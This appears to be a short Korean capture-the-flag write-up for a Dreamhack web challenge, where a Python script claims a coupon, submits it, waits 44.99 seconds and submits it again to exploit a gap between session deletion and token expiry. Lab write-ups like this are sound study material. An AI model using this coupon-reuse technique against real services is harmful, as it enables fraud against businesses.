# 키워드
- 스크립트 작성
- 세션
- 논리오류

# 풀이
*처음에 jwt문제인줄 알았지만 아니였고, 레컨 문제인줄 알았지만 그것도 아니였음*

- 세션은 삭제되었지만 JWT는 만료가 안되는 때가 존재함을 이용함 
- 문제 풀이 당시 인터넷 속도 이슈 때문인지 남들보다 0.01초 차이 정도 발생했음
```python
import requests as req
import json
import time
import threading

domain = "http://host3.dreamhack.games:13654"


def get_session():
    url = domain + "/session"
    res = req.get(url=url)
    session_json = json.loads(res.text)
    session = session_json["session"]
    return session


def coupon_claim(session):
    url = domain + "/coupon/claim"
    headers = {"Authorization": session}
    res = req.get(url=url, headers=headers)
    coupon_json = json.loads(res.text)
    coupon = coupon_json["coupon"]
    return coupon


def coupon_submit(session, coupon):
    url = domain + "/coupon/submit"
    header = {"Authorization": session, "coupon": coupon}
    res = req.get(url=url, headers=header)
    print(res.text)


if __name__ == "__main__":
    session = get_session()
    print(session)
    coupon = coupon_claim(session)

    coupon_submit(session=session, coupon=coupon)

    time.sleep(44.99)

    coupon_submit(session=session, coupon=coupon)

```
